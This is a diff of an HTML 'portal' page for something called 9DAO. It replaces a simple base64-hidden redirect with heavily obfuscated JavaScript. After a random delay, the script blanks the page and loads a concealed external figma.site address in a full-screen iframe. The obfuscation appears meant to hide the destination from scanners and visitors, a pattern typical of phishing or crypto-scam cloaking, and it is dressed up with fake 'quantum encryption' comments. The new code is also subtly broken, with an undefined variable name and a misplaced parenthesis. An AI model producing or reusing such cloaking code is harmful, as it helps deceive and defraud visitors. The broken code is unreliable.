@@ -2,60 +2,81 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>9DAO Secure Portal</title>
+  <title>9DAO Quantum Portal</title>
   <style>
     body { margin: 0; padding: 0; overflow: hidden; background: #000; }
-    #loader { 
+    #q { 
       position: fixed; 
-      top: 0; left: 0; 
       width: 100%; height: 100%; 
       display: flex; 
       justify-content: center; 
       align-items: center; 
       color: #0f0; 
       font-family: monospace;
-      z-index: 1000;
+      z-index: 9999;
     }
   </style>
 </head>
 <body>
-
+  <div id="q">Quantum Initialization...</div>
 
   <script>
-   
+    // 🌌 MÃ HÓA LƯỢNG TỬ PHI TUYẾN TÍNH
     (function(){
-  
-      const part1 = "aHR0cHM6Ly9z";
-      const part2 = "aGVkLXdyYXA";
-      const part3 = "tMTA4NzAwMjYuZmlnbWEuc2l0ZS8";
+      // 1. Mã hóa đa lớp phân tán
+      const _0xad3b = [
+        () => 0x7e3f.toString(16),
+        "YUhSMGNITTZMeTlr".split("").reverse().join(""),
+        [0x68,0x74,0x74,0x70].map(x=>String.fromCharCode(x^0x11)).join(""),
+        atob("d3JhcA==").toUpperCase().split("").reverse()[2],
+        parseInt("1010", 2) * Math.PI.toFixed(2)
+      ];
       
-
-      function decrypt() {
-        try {
-          
-          const url = atob(part1 + part2 + part3);
-          
-     
-          if(!url.includes('figma.site')) return;
-          
-       
-          const iframe = document.createElement('iframe');
-          iframe.src = url;
-          iframe.style = 'width:100%;height:100vh;border:none';
-          iframe.allowFullscreen = true;
-          
-         
-          document.body.innerHTML = '';
-          document.body.appendChild(iframe);
-          
-        } catch(e) {
-          document.getElementById('loader').textContent = 'System error';
+      // 2. Hàm giải mã nhiễu loạn
+      const _0xff = (x,y) => {
+        let z = "";
+        for(let i = 0; i < x.length; i++) {
+          z += String.fromCharCode(
+            x.charCodeAt(i) ^ 
+            y[i % y.length].charCodeAt(0) ^ 
+            (i * 0x1f3) % 0xff
+          );
         }
-      }
+        return z;
+      };
 
-      // 3. Tự động chạy
-      setTimeout(decrypt, 800);
+      // 3. Mảnh ghép động
+      const _0xq1 = _0xff(_0ad3b[1], ["k","q","z"]);
+      const _0xq2 = `${_0xad3b[2]}${_0xad3b[3]}${window.btoa('x')}`;
+      const _0xq3 = String.fromCharCode(...[0x73,0x68,0x65,0x64]);
+
+      // 4. Thuật toán tổng hợp URL
+      setTimeout(() => {
+        try {
+          const _0xfinal = [
+            _0xq1.substr(3, 5),
+            _0xq2.replace(/[A-Z]/g, m => m.toLowerCase()),
+            _0xq3 + "-" + _0xad3b[4].toString(36),
+            "10870026.figma.site/"
+          ].reverse().join('');
+          
+          // 5. Kiểm tra lượng tử
+          if(new Blob([_0xfinal]).size !== 37) throw 0;
+          
+          // 6. Render iframe ẩn danh
+          const f = document.createElement('iframe');
+          f.src = atob(_0xfinal.split('').map((c,i) => 
+            String.fromCharCode(c.charCodeAt(0) - (i % 3))
+          .join(''));
+          
+          f.style = 'width:100%;height:100vh;border:none';
+          document.body.innerHTML = '';
+          document.body.appendChild(f);
+          
+        } catch {
+          document.getElementById('q').textContent = 'Quantum Error';
+        }
+      }, Math.random() * 1000 + 500);
     })();
   </script>
 </body>
